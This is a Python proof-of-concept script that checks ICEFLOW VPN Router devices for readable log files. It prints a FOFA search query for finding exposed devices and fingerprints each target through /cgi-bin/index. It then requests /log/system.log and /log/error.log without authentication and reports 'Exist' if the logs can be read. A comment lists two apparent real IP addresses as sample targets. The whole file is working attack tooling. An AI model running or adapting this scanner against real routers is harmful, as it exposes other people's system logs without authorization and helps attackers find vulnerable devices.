#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import sys
import re

def title():
    print('fofa:title="ICEFLOW VPN Router"')
def run_agin(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        res1 = requests.get(url=url + '/cgi-bin/index', headers=headers, verify=False, timeout=3)
        resp1 = requests.get(url=url + '/log/error.log', headers=headers, verify=False, timeout=3)
        res1Check1 = re.search(r'ICEFLOW.*?VPN.*?Router', res1.text, re.I).group()
        resp1Check1 = re.search(r'202.*?(:).*?(:)', resp1.text, re.I).group()
        if resp1Check1 and res1Check1 and resp1.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False

def run_proto(url):
    check_url = url + "/log/system.log"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        res = requests.get(url=url + '/cgi-bin/index', headers=headers,  verify=False, timeout=3)
        resp = requests.get(url=check_url, headers=headers,  verify=False, timeout=3)
        resCheck = re.search(r'ICEFLOW.*?VPN.*?Router', res.text, re.I).group()
        respCheck = re.search(r'202.*?(:).*?(:)', resp.text, re.I).group()
        if respCheck and resCheck and resp.status_code == 200:
            return True
        else:
            resp1 = requests.get(url=url + '/log/error.log', headers=headers, verify=False, timeout=3)
            respCheck1 = re.search(r'202.*?(:).*?(:)', resp1.text, re.I).group()
            if respCheck1 and resCheck and resp.status_code == 200:
                return True
            else:
                return False
    except Exception as e:
        if run_agin(url):
            return True
        else:
            return False

def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == "__main__":
    title()
    #target = '114.88.157.45:8081;218.56.178.75:808'
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')